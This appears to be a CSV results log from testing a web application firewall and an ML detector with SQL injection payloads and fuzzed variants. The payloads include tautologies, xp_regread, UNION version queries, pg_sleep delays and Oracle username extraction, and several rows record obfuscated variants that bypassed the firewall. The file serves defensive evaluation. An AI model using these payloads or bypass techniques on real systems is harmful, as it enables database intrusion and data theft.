Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5,Fuzzed Payload 6,Fuzzed Timestamp 6,WAF Status 6,ML Status 6,Combined Result 6,Fuzzed Payload 7,Fuzzed Timestamp 7,WAF Status 7,ML Status 7,Combined Result 7,Fuzzed Payload 8,Fuzzed Timestamp 8,WAF Status 8,ML Status 8,Combined Result 8,Fuzzed Payload 9,Fuzzed Timestamp 9,WAF Status 9,ML Status 9,Combined Result 9,Fuzzed Payload 10,Fuzzed Timestamp 10,WAF Status 10,ML Status 10,Combined Result 10
7,2025-10-25T13:14:33.745677,"or 0  =  0 #""",403,200,200,both_incorrect,"oR	(selECT  or 0)  =  'w)' likE 'w)'/*mz'k~*/#""",2025-10-25T13:14:50.441845,200,403,waf_incorrect_ml_correct,"OR
(selEcT/**/ oR 0x0)   lIkE   'w)' lIkE 'w)'/**/#""S",2025-10-25T13:15:08.873557,403,403,both_correct,"or
(sElECt/**/ OR 0x0)   lIKE   'w)'/**/LiKe
'w)'/**/#""Ss",2025-10-25T13:15:26.152363,403,403,both_correct,"Or
(sELECt/**/ or 0x0)   LikE  
'w)'/**/LiKE
'w)' #""Ssg/",2025-10-25T13:15:43.294112,403,403,both_correct,"oR
(sELect/*C[ */ or 0x0)   lIKE  
'w)' lIkE	'w)' #""Ssg/",2025-10-25T13:16:00.253064,403,403,both_correct,"or
(SELECt/**/ or/**/0x0)   like  
'w)'	Like	'w)' #""Ssg/",2025-10-25T13:16:17.850569,403,403,both_correct,"oR
(SElecT/**/ oR 0x0)   LikE  
'w)'
lIKe	'w)' #""Ssg/\",2025-10-25T13:16:35.624990,403,403,both_correct,"or
(seLect/**/ OR/**/0x0)  	liKe  
'w)'
liKe	'w)' #""Ssg/\Y",2025-10-25T13:16:53.761808,403,403,both_correct,"Or
(SElEcT  oR/*hp~*/0x0)  	lIKE  	'w)'
LiKe	'w)' #""Ssg/\Y",2025-10-25T13:17:12.240271,403,403,both_correct,"oR
(sElECt  or/*~y""*/0x0)  
liKE/**/ 	'w)'
like	'w)' #""Ssg/\Y",2025-10-25T13:17:29.684740,403,403,both_correct
8,2025-10-25T13:17:47.777823, exec xp_regread,403,403,403,both_correct,"	exec/**/xp_regread",2025-10-25T13:18:04.368022,200,403,waf_incorrect_ml_correct,"	exec	xp_regread",2025-10-25T13:18:23.456560,403,403,both_correct," exec	xp_regread",2025-10-25T13:18:45.104126,403,403,both_correct, exec/**/xp_regread,2025-10-25T13:19:03.404729,200,403,waf_incorrect_ml_correct,/**/exec/**/xp_regread,2025-10-25T13:19:21.514266,200,403,waf_incorrect_ml_correct,/**/exec xp_regread,2025-10-25T13:19:39.221056,403,403,both_correct," exec
xp_regread",2025-10-25T13:19:56.717264,403,403,both_correct,/*M=BD*/exec xp_regread,2025-10-25T13:20:14.454219,403,403,both_correct,/**/exec/**/xp_regread,2025-10-25T13:20:32.655873,200,403,waf_incorrect_ml_correct,"/**/exec	xp_regread",2025-10-25T13:20:50.344712,403,403,both_correct
9,2025-10-25T13:21:08.919570," select * from users where id  =  1 or ""%."" or 1  =  1 -- 1",403,403,403,both_correct," SElecT * FROM users WHERE id   lIke /**/ 1 or ""%."" Or
1  =  (sElecT  AND 1) lIke 273 -- 1Y",2025-10-25T13:21:27.699183,403,403,both_correct,"	SEleCt * FRom users WhEre id   LIKe /**/ 1 Or ""%."" or
3 like 3  =/**/ (SeLect  And 1) lIke  Or 0x0 -- 1Y",2025-10-25T13:21:46.386167,403,403,both_correct,"	SeLeCt * fRoM users whERe id   liKe   1 Or ""%."" or	(SELECT  AND 1) LikE 'd'<>'dF'   like /**/ (selECt  AND 1) lIKE  OR 0x0 -- 1Y:7",2025-10-25T13:22:04.092256,403,403,both_correct,"	selecT * FrOm users where id   lIke   1 OR ""%."" Or	(seleCt  anD 1) LiKE 'd'<>'dF'   lIKe   (sELEcT	 AnD (SeLEcT 5765=5765)) LiKE  || 0x0 -- 1Y:(SELECT 1)<C",2025-10-25T13:22:21.289424,403,403,both_correct,"
sElect/**/* From users whErE id   LIkE   0x1 Or ""%."" oR	(SeLEcT  aNd (SeLECt 1)) LIKE 'd'<>'dF'   LikE   (SELeCT	 aNd (SElECt 5765='tzE'='tzE')) lIKe  || 0x0 -- 1Y:(SELECT 1)<C",2025-10-25T13:22:39.797855,403,403,both_correct,"
sElECt/*S}*/* FROM users WHERE id   LIkE   0x1 OR ""%."" or	(SeLeCt  anD (SElECT 1)) like 'd' NOT LIKE 'dF'   likE   (selEct  ANd (SelEct 5765='tzE'='tzE')) lIke  || 0x0 -- 1Y:(SELECT/**/ OR 0x1189 NOT LIKE 4490)<C",2025-10-25T13:22:57.388700,403,403,both_correct," SElEcT/*z^2*/* FrOM users WHERE id   LiKe   0x1 OR ""%."" or	(SeLEct  ANd (SeLECT  or 0)) lIKe 'd' NOT LIKE 'dF'   LIKE   (SelECt  aND (SELEcT (SELECT 5765)='tzE'='tzE')) lIke   or  0x0 -- 1Y:(SELECT  OR 0x1189 NOT LIKE '?*'<>'?*8')<C",2025-10-25T13:23:14.706275,403,403,both_correct," seLEct/*z^2*/* From users wHEre id/**/  likE   0x1 Or ""%."" or (SelEcT  and (sElect  oR  ANd 1)) lIKe 'd' NOT LIKE 'dF'   LIkE   (sEleCT  aNd (SELect (SELeCt (SELECT 5765))='tzE' LIKE 'tzE')) Like   Or  0x0 -- 1Y:(SELECT  OR 0x1189 NOT LIKE '?*'<>'?*'f'='f'')<C^",2025-10-25T13:23:32.641451,403,403,both_correct," SeLect/**/* fROM users wheRE id/**/  lIKe   0x1 Or ""%."" oR (sELeCt  And (SELeCT  or  And	0x1)) lIke 'd' NOT LIKE 'dF'   liKE   (SeLecT  and (SELECT (SELect (SELECt (SeLECT 1)))='tzE' LiKe 'tzE')) LikE   OR  0x0 -- 1Y:(SELECT  OR/**/0x1189 NOT LIKE '?*'<>'?*'f'='f'')<C^",2025-10-25T13:23:51.109113,403,403,both_correct," sElecT/**/* frOm users WHerE id   lIKe   0x1 oR ""%."" Or (sElEct  ANd (selecT  Or  AnD
0x1)) lIKe 'd' NOT LIKE 'dF'   LIkE   (SElECt  anD (SeLECT (seLeCT (SeleCT (SElecT 0x1))) LIke 'tzE' lIKE 'tzE')) LikE   or  0x0 -- 1Y:(SELECT  OR/**/0x1189 NOT LIKE '?*'<>'?*'f'='f'')<C^ OR 'dHFY7' LIKE 'dHFY7'-",2025-10-25T13:24:08.163422,403,403,both_correct
10,2025-10-25T13:24:25.626065," select * from users where id  =  1 <@&@ union select 1,version  (    )   -- 1",403,403,200,waf_correct_ml_incorrect," SelecT * FRom users whERe/**/id   lIKe   1 <@&@ union SelECT  or 0x0,version  (    )   --
6170<>6171",2025-10-25T13:24:42.453443,403,403,both_correct," SeLecT * FrOM users WHerE/**/id/**/  lIke   (SELECT 1) <@&@ union selECT  or 0x0,version  (    )   --	6170<> AND 'H' NOT LIKE 'H%'",2025-10-25T13:25:01.636320,403,403,both_correct," sELeCt * FroM users whEre/**/id   like   (seleCT 'f1' not like 'f1{') <@&@ union SeLeCT  or 0x0,version  (    ) 
 --	 OR 0x0<> AND 'H' NOT LIKE 'H%'",2025-10-25T13:25:19.463536,403,403,both_correct," SelEct * FRom users wherE id   lIKE   (SelECT 'f1' not like 'f1{') <@&@ union seLEcT  or 0x0,version  (    )   --	 OR 0x0<> AND 'H' NOT LIKE 'H%'",2025-10-25T13:25:36.926007,403,403,both_correct," SELecT * FRom users WhEre id   LIKe   (sELeCt 'f1' not like 'f1{') <@&@ union/**/SeLeCt  Or 0x0,version  (    )   --
 oR 0x0<> anD 'H' NOT LIKE 'H%'",2025-10-25T13:25:56.079856,403,403,both_correct," SeLEct * From users WheRe id   LiKE   (seLEct 'f1' not/**/LikE 'f1{') <@&@ union/**/SElECt  or 0x0,version  (    )   --  or 0x0!= AnD 'H' NOT LIKE 'H%'",2025-10-25T13:26:13.751323,403,403,both_correct," sElEcT * FRoM users WhEre id   lIke   (SELEct 'f1' not/**/LiKe 'f1{')
<@&@ union/*U~L'*/SEleCT/**/ || 0x0,version  (    )   --  or 0x0!= AnD 'H' NOT LIKE 'H%'",2025-10-25T13:26:32.485690,403,403,both_correct," sELect * FRoM users WhERe id   like   (SelEct 'f1' not/*Z""Y3R*/LIke 'f1{')
<@&@ union/*U~L'*/SeLeCT/**/ || 0x0,version  (    )   --
/**/or 0x0!= AnD 'H' NOT LIKE 'H%'",2025-10-25T13:26:50.154440,403,403,both_correct," SELect * FRoM users wHere id   Like   (SeLeCT 'f1' not/*?*/LIkE 'f1{')	<@&@ union/*U~L'*/seleCt/**/  OR  0x0,version  (    )   --
 oR 0x0!= aNd 'H' NOT LIKE 'H%'",2025-10-25T13:27:07.996813,403,403,both_correct," sELECT * From users wHere id   LikE   (sElECt 'f1' not/**/LiKE 'f1{')	<@&@/**/union/*U~L'*/seLECt/**/  oR	 0x0,version  (    )   --
 oR 0x0!= AND 'H' not like 'H%'",2025-10-25T13:27:24.893265,403,403,both_correct
11,2025-10-25T13:27:42.522913,1 or pg_sleep  (  __TIME__  )  --,403,403,403,both_correct,"(SELECT 1) not/**/like 0x132e OR pg_sleep  (
 __TIME__  )  --",2025-10-25T13:28:07.565142,403,403,both_correct,"(sELecT (SElECt (SELECT 1))) not/**/Like 0x132e || pg_sleep  (	 __TIME__ /**/)  --",2025-10-25T13:28:26.780930,403,403,both_correct,"(SEleCT (SeLEcT (seLECT (SELECT  && 1361 NOT LIKE 1362)))) not LIkE 0x132e || pg_sleep  (		__TIME__ /**/)  --",2025-10-25T13:28:50.466055,403,403,both_correct,"(SELEct/**/(seLEcT (sElECt (selecT   AND  (SelEct (SELECT 1)) LikE 1717 NOT LIKE 1362)))) not LIkE 0x132e || pg_sleep 
(		__TIME__ /**/)  --",2025-10-25T13:29:12.393020,403,403,both_correct,"(SelECT/*L$*/(seLECT (SeLect (SelEct   AND  (sELEcT (SEleCt 'h?vP' not like 'h?vPK')) LikE 1717 NOT LIKE (SelEcT  or 0))))) not LIkE 0x132e || pg_sleep  (		__TIME__  )  --",2025-10-25T13:29:31.208795,403,403,both_correct,"(sEleCT/*	|5*/(SElect (sElECT (sElEct   And  (SeLeCt (SELECT 'h?vP' not like 'h?vPK')) LIKe  OR '.'='.' NOT LIKE (sELeCT  or 0x0))))) not LIkE 0x132e  oR  pg_sleep  (	 __TIME__  )/**/ --",2025-10-25T13:29:48.739242,403,403,both_correct,"(SelEct/*	|(SELECT ',' LIKE	',')*/(seLEct (SElect (SELECt   aNd  (seLect (seleCt 'h?vP' not like 'h?vPK')) LiKE  or '.' liKE '.' NOT LIKE (sELeCt  OR 0x0))))) not LIkE 0x132e  Or  pg_sleep  (	 __TIME__  )  --",2025-10-25T13:30:05.545227,403,403,both_correct,"(SELEcT/* |(SELECT ',' LIKE	',')*/(SElEcT (selECT (seLect   AnD  (SElect (SELEct 'h?vP' not like 'h?vPK')) lIkE  oR '.' liKe '.' NOT LIKE (seLECt  OR 0x0))))) not/*9[)o*/LIKe 0x132e  oR  pg_sleep  (	 __TIME__  )  --",2025-10-25T13:30:23.963052,403,403,both_correct,"(SELEcT/* |(SELECT ',' LIKE	',')*/(sELEcT (sElEcT (SELECT   anD  (SElEct (sEleCT 'h?vP' not like 'h?vPK')) likE /**/|| '.' liKe
'.' NOT LIKE (seLEcT  Or 0x0))))) not/*'_0'<>'_0m'[)o*/liKE 0x132e  oR  pg_sleep  (	 __TIME__  )  --",2025-10-25T13:30:43.071502,403,403,both_correct,"(sEleCt/* |(SELECT ',' LIKE	',')*/(SELecT (sElEcT (sELect   And  (sELeCT (seLeCT 'h?vP' not like 'h?vPK')) lIke
  OR  '.' LIke
'.' NOT LIKE (seLecT  OR 0x0))))) not/*'_0'<>'_0m'[)o*/LikE 0x132e  oR  pg_sleep  (	 __TIME__  )  --",2025-10-25T13:31:00.279283,403,403,both_correct
12,2025-10-25T13:31:17.699147,select * from users where id  =  1 <@ or 1  =  1 -- 1,403,403,403,both_correct,"seLECt * FrOM users WhERE id   LiKE    OR 0/**/<@ OR 0x1  = 	1 -- 'h Yas'<>'h Yasc'",2025-10-25T13:31:35.356035,403,403,both_correct,sELeCT * frOm users whERE id   lIke    oR 0 <@ Or 0x1   like    OR 0 LIKE 0x26fe -- 'h Yas'<>'h Yasc'yv,2025-10-25T13:31:54.075082,403,403,both_correct,"SElEct * froM users WHeRe id   LikE    or 'm'!='mm' <@/**{K*/or 0x1   lIkE    or 0x0 lIkE 0x26fe -- 'h	Yas'<>'h Yasc'yv",2025-10-25T13:32:11.715965,403,403,both_correct,sELeCT * FrOM users wheRE id   lIKe    OR/**/'m' NOT LIKE 'mm' <@/**{K*/oR 0x1   LIkE    Or 0x0 lIKe 0x26fe -- 'h Yas'<>'h Yasc'yvI(,2025-10-25T13:32:29.230803,403,403,both_correct,"SElect * FrOM users where id   LiKe   
||/**/'m' NOT/**/LIKE 'mm' <@/**{K*/Or 0x1   lIkE    or 0x0 LiKE 0x26fe -- 'h Yas'<>'h Yasc'yvI(ff",2025-10-25T13:32:47.632922,403,403,both_correct,"SelEct * FrOM users wheRe id   lIkE   	||/**/'m' NOT/**/lIkE 'mm' <@/**{K*/oR 0x1   likE    oR 0x0 liKE/**/0x26fe -- 'h Yas'<>'h Yasc'yvI(ffm`",2025-10-25T13:33:04.779861,403,403,both_correct,"SelecT * FrOM users WhEre id   LIke   
 or  'm' NOT/*`$rf*/LikE 'mm' <@/**{K*/oR 0x1   liKe    Or 0x0 lIKE/**/0x26fe -- 'h Yas'<>'h Yasc'yvI(ffm`",2025-10-25T13:33:22.681136,403,403,both_correct,sElECt * fROM users WhErE id   lIKe    /**/or  'm' NOT/*`$rf*/LIKe 'mm' <@/**{K*/oR 0x1   LikE    or 0x0 lIKE/**/0x26fe -- 'h Yas'<>'h Yasc'yvI(ffm`,2025-10-25T13:33:40.965138,403,403,both_correct,"selEcT * FRom users whEre id   liKE	   /**/or  'm' NOT/*`$rf*/lIKE 'mm' <@/**{K*/or 0x1   LIKe    || 0x0 liKE/**/0x26fe --/**/'h Yas'<>'h Yasc'yvI(ffm`i",2025-10-25T13:33:59.035371,403,403,both_correct,"sElECT * FRoM users Where id   liKe
   /**/oR  'm' NOT/*`$rf*/liKe 'mm' <@/**{K*/Or 0x1   LIkE     OR  0x0 Like/**/0x26fe -- 'h Yas'<>'h Yasc'yvI(ffm`i*O",2025-10-25T13:34:16.951113,403,403,both_correct
13,2025-10-25T13:34:35.007740,select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,403,403,403,both_correct,"sElECT/**/*	froM users whEre id  =  1 %$  oR (SELECT 0) oR 1  =  'HPT""y'!='HPT""yn' -- 1",2025-10-25T13:34:53.408610,403,403,both_correct,"SElECT/*%Dn*/*	fROm users WHeRE id  =  1/**/%$  oR (SELECT (seLEcT (sElecT 1))) OR 8892<>8893  	lIke   'HPT""y'!='HPT""yn' -- 1",2025-10-25T13:35:13.330116,403,403,both_correct,"sEleCT/*%Dn*/*	FrOm users WHERE id  =  1/*F#*/%$  Or (seleCT (SELeCt (SEleCt (sELEcT/**/1)))) OR 8892!=(sELeCT 8893) 
	LikE   'HPT""y'!='HPT""yn' -- 7260<>7261",2025-10-25T13:35:31.731708,403,403,both_correct,"seLecT/*%Dn*/*	fROM users wheRE id /**/=  1/*EW~*/%$  Or (SeLeCt (seLect (SElect (SelECT/**/'8e' NOT LIKE '8e.')))) OR 0x22bc!=(SeleCT 8893) 		like   'HPT""y'!='HPT""yn' --  OR 0<>7261",2025-10-25T13:35:50.222814,403,403,both_correct,"sElect/*%Dn*/*	FrOm users wHeRe
id  =  (SELECT  OR 0)/*2%m0*/%$  OR (SeLect (SeleCT (SeLeCT (seLect/**/'8e' NOT LIKE '8e.')))) Or 0x22bc!=(SELECt '	0'<>'	0x') 		lIkE   'HPT""y' not like 'HPT""yn' --  OR 0<>7261",2025-10-25T13:36:09.575421,403,403,both_correct,"SELeCt/*%Dn*/*	FrOm
users wHere
id  =  (SElect  || 0)/**/%$  or (SeLeCt (SeLecT (sElECt (sELecT '8e' NOT LIKE '8e.')))) oR 0x22bc!=(sElecT '	'&'!='&y''<>'	0x') 		LIke   'HPT""y' not like 'HPT""yn' --  OR 0x0<>(SELECT 1){s",2025-10-25T13:36:27.891964,403,403,both_correct,"sElect/**/*	FRoM
users where
id   LIKE   (seLEct  || '
' NOT LIKE '
*') %$  oR	(SELect (sELeCT (selEct (Select '8e' NOT LIKE '8e.')))) OR 0x22bc!=(sELecT '	'&'!='&y''<>'	0x') 		lIkE   'HPT""y' not like 'HPT""yn' --  OR 0x0<>(SELECT 0x1){s~",2025-10-25T13:36:46.269031,403,403,both_correct,"seleCT/**/*	FroM
users WHeRE id   LIke   (sELecT  || '
' NOT LIKE '
*') %$  Or	(selecT (selecT (sElect (SElECT '8e' not like '8e.')))) or 0x22bc!=(sEleCT '	'&'!='&y''<>'	0x') 		lIkE   'HPT""y' not like 'HPT""yn' --/**/ OR 0x0<>(SELECT 0x1){s~",2025-10-25T13:37:06.353958,403,403,both_correct,"SelecT/* 3*/*	frOM
users wHERe id   Like   (sELEct  || ' ' NOT LIKE '
*') %$  OR	(SeLeCT (SELecT (sElECt (sELeCt '8e' not like/**/'8e.')))) OR 0x22bc!=(sElEct '	'&'!='&y'' not like '	0x') 		lIKe   'HPT""y' not like 'HPT""yn' --/**/ OR 0x0<>(SELECT 0x1){s~",2025-10-25T13:37:24.556194,403,403,both_correct,"SeLeCT/*xc*/*	FROM
users WhERe id   Like   (seLECT  || ' ' NOT LIKE '
*') %$  Or	(select (SELeCT (select (SelEct '8e' not like '8e.')))) OR 0x22bc<>(sELECT '	'&'!='&y'' not like '
0x') 		LiKe   'HPT""y' not like 'HPT""yn' --/**/ OR 0x0<>(SELECT 0x1){s~",2025-10-25T13:37:42.542346,403,403,both_correct
14,2025-10-25T13:38:02.503160," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",403,403,403,both_correct," and (SELECT '|'<>'|D')   LIke   utl_inaddr.get_host_address   (    (   SeLECt
DIsTinCT  (  USERNAME/**/ )   fRoM   (  selecT DiSTinCt  (  USERNAME  )  , ROWNUM AS LIMIT from SYS.ALL_USERS  )   WHERe LIMIT  =  (SELECT 6)   )    )    aND 'i'  =  'i",2025-10-25T13:38:20.426020,200,403,waf_incorrect_ml_correct," AND (sElect '|'<>'|D')   LiKE   utl_inaddr.get_host_address   (    (   sELEcT distiNct /**/(  USERNAME/*B_Yv*/ )   fROm   (  SeLect DiSTinct  (  USERNAME  )  , ROWNUM AS LIMIT fROM SYS.ALL_USERS  )   whERe LIMIT  =  (sELECT  or 7557!=0x1d86)   )    )    AnD 'i'   liKE   'i",2025-10-25T13:38:40.142287,200,403,waf_incorrect_ml_correct," AND (SElEcT '|'<>'|D')   like
  utl_inaddr.get_host_address   (    (   sELect dIstiNCT  (  USERNAME/**/ )   fROm   (  seleCt DistINCT  (  USERNAME  )  , ROWNUM AS LIMIT FrOM SYS.ALL_USERS  )   wHerE LIMIT   Like   (sELeCt  Or (SELECt 2046 In (2045, AND 1,2047))!=0x1d86)   )    )    and 'i'   LIKE   'i",2025-10-25T13:38:58.970140,200,403,waf_incorrect_ml_correct," ANd (SElEcT '|'<>'|D')   LIKe   utl_inaddr.get_host_address   (    (   SElect distInct  (  USERNAME  )   FRom   (  SeleCT DIsTINcT  (  USERNAME  )  , ROWNUM As LIMIT froM SYS.ALL_USERS  )   wHEre LIMIT   lIkE   (sEleCt  OR (seLECT 2046 In (2045, And 7899 NOT LIKE  AND 1,(SElECT 2047)))!=0x1d86)   )    )    anD 'i'   liKE   'i",2025-10-25T13:39:17.947904,200,403,waf_incorrect_ml_correct," ANd (SeLecT '|'<>'|D')   LIke   utl_inaddr.get_host_address  /**/(
   (   SELECt dIstiNcT  (  USERNAME  )   FROm   (  SelECt diStincT  (  USERNAME  )  , ROWNUM aS LIMIT FROm SYS.ALL_USERS  )   where LIMIT   lIKE   (seLect  or (sElECt 2046 IN (3146!=3147, And 7899 NOT LIKE  aNd (sEleCT 1),(sELECt (seLECT 2047))))!=0x1d86)   )    )    anD 'i'   liKE   'i",2025-10-25T13:39:36.370642,403,403,both_correct," aNd (sELeCT '|'<>'|D')   LIke   utl_inaddr.get_host_address   (	   (   SelEct DIStInCT  (  USERNAME  )   frOM   (  SeLeCT DIStINcT  (  USERNAME  )  , ROWNUM as LIMIT fROM SYS.ALL_USERS  )   WhERe LIMIT   lIKE   (seLEct  oR (SeLEcT 2046 iN ((SELECT 3146)!=3147, AnD 7899 NOT LIKE  And (SELecT 'F' LIKE 'F'),(SELect (sELecT (sELeCt 1)))))<>0x1d86)   )    )    AnD 'i'   liKE   'i",2025-10-25T13:39:54.435589,200,403,waf_incorrect_ml_correct," aNd (seLeCt '|'<>'|D')   lIKe   utl_inaddr.get_host_address   (	   (   SELeCt disTINct  (  USERNAME  )   fROM   (  SElECt distINCT  (  USERNAME  )  , ROWNUM As LIMIT fROm
SYS.ALL_USERS  )   WHEre LIMIT   likE /**/ (sELeCt  OR (sElecT (seLecT 1) in ((sElECt 3146)!=3147, and (sEleCT 'm' LIKE 'm') not like  anD (SelEct 'F' lIKE 'F'),(sElECt (seLeCt (SeLEct 1)))))<>0x1d86)   )    )    aND 'i'   LiKe   'i",2025-10-25T13:40:13.626967,200,403,waf_incorrect_ml_correct," anD (sELecT '|'<>'|D')   liKE   utl_inaddr.get_host_address   (
   (   SelECT distINCT  (  USERNAME  )  /**/fRom   (  SELECT DISTInCT  (  USERNAME  )  , ROWNUM aS LIMIT FROm
SYS.ALL_USERS  )   WHEre LIMIT   liKE /*+*/ (sELecT  or (SeLecT (select 1) in ((SelEct ''<>'B')!=(SELeCt 3147), and (sELecT 'm' LIkE 'm') not like  aND (seLecT 'F' liKE 'F'),(SelECt (seLECT (Select  OR 0)))))<>0x1d86)   )    )    AND 'i'   LikE   'i",2025-10-25T13:40:32.076971,403,403,both_correct," aND (sElECt '|'<>'|D')   LIkE   utl_inaddr.get_host_address   (
   (   seLeCt dIstiNCt  (  USERNAME  )   fROM   (  SeleCT distIncT  (  USERNAME  )  , ROWNUM AS LIMIT fROM
SYS.ALL_USERS  )   WHERe LIMIT   LIkE /**/ (SelEct  or (seleCt (sELeCT (SEleCT 1)) in
((SElecT ''<>'B')<>(SeLECT '+'<>'+9'), aND (SElEct 'm' liKe 'm') not like  aNd (sELECT 'F' LIkE 'F'),(seLEcT (sElecT (SeLECT  OR 0x0)))))<>0x1d86)   )    )    aND 'i'   lIkE   'i",2025-10-25T13:40:50.448110,403,403,both_correct," And (seLeCt '|' not like '|D')   LIKe   utl_inaddr.get_host_address /**/ (
